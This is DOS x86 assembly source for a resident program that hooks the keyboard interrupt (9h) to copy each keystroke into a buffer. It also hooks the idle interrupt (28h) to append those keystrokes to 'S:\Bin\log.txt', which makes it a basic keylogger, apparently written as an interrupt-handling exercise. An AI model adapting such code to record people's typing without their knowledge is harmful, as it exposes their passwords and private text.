.186
.model tiny
.code 
org 100h
locals @@


INT_9		equ 	9h*4h
INT_28		equ	28h*4h

Start:

		mov bx, INT_9
		mov dx, offset New09
		call interupt_new_9
		call interupt_new_28


                call stay_resident


;====================================a?======
;Programm ends and stay resident
;====================================>=======

RESIDENT	equ	3100h

stay_resident	proc

		mov ax, RESIDENT
		mov dx, offset EndLabel 
		shr dx, 4
		inc dx  
		int 21h

		ret
endp

;==============================================
;Destruct - bx, ax, es
;Input    - bx - number of interuption * 4
;         - dx - adress of NEw_interuption
;Output - Old09 - adrest of old interupt 
;===========>==================================

interupt_new_9	proc

		cli

		mov bx, INT_9
		xor ax, ax
		mov es, ax

		mov ax, word ptr es:[bx]
		mov word ptr Old09_o, ax
		mov ax, word ptr es:[bx+2]
		mov word ptr Old09_s, ax

		mov ax, 2509h
		mov dx, offset New09
		int 21h	

		sti

		ret
endp

;==============================================
;Destruct - bx, ax, es
;Input    - bx - number of interuption * 4
;         - dx - adress of NEw_interuption
;Output - Old028 - adress of old interupt 
;==============================================

interupt_new_28	proc

		cli

		mov bx, INT_28
		xor ax, ax
		mov es, ax

		mov ax, word ptr es:[bx]
		mov word ptr Old28_o, ax
		mov ax, word ptr es:[bx + 2]
		mov word ptr Old28_s, ax

		mov ax, 2528h
		mov dx, offset New28
		int 21h

		sti

		ret
endp

New28 proc
		pusha
		push es ds

		call write_buff 

		pop ds es
		popa

			
		pushf
		call dword ptr cs:[Old28_o] 	;call original int 28h

		iret
endp



Old28_o dw 0
Old28_s dw 0


New09 proc
		pusha
		push es ds

		pushf
		call dword ptr cs:[Old09_o] 	;call original int 9h


		call read_to_buff	
		
		pop ds es
		popa

		iret
endp
		
Old09_o dw 0
Old09_s dw 0

		

read_to_buff proc 
	
		push ds
		push cs
		pop ds
				
		mov ah, 01h ;save alpha	
		int 16h

		jz @@exit

		mov bl, tail_ind  ;setting bl as place to move
		xor bh, bh

                mov buff[bx], al
		inc tail_ind 


@@exit:

		pop ds

		ret
endp

;====================================================
;Destroy - ax, bx
;Output  - bx - file handler, dx - file trail
;===================================================
OPEN		equ	3dh

open_file	proc
		
		mov dx, offset FILE_NAME
		mov ah, OPEN
		mov al, 1
		int 21h

		mov file_handler, ax	
		ret
endp

;==================================================
;Input - bx - file handler
;Destroy - ax, cx, dx
;=====================================================
MOVE_POINTER	equ	4202h

pointer_to_end	proc

		mov ax, MOVE_POINTER  
		mov bx, file_handler 
		xor cx, cx
		xor dx, dx
		int 21h

		ret
endp

;==================================================
;Input -  file_handler
;	 cx - number of bytes to write
;	 ds:dx - adress of a buffer
;Destroy - ah
;====================================================

WRITE		equ 	40h

write_file	proc

		mov bx, file_handler
		mov ah, WRITE
		int 21h

	        ret
endp

;==============================================?===
;Input - bx - filg handler
;Destroy - ah
;============a?=====================================

CLOSE		equ 3eh

close_file	proc
		
		mov ah, CLOSE
		mov bx, file_handler
		int 21h

		ret
endp

write_buff proc 


		push ds
		push cs
		pop ds
		
		mov cl, cs:tail_ind
		xor ch, ch
	
		push cx

		call open_file
		call pointer_to_end
		
			mov al, head_ind    ; necessary dx - adress of a buffer
			xor ah, ah
			mov dx, offset buff
			add dx, ax
	
			pop cx

	
			sub cl, head_ind    ;length
			xor ch, ch
		
			call write_file
		
		add cl, head_ind
		xor ch, ch
		mov head_ind, cl

		call close_file

		pop ds

		ret
endp





FILE_NAME db 'S:\Bin\log.txt', 0
file_handler dw ?

head_ind db 0d
tail_ind db 0d

buff db 256d dup (0h)

EndLabel:
end Start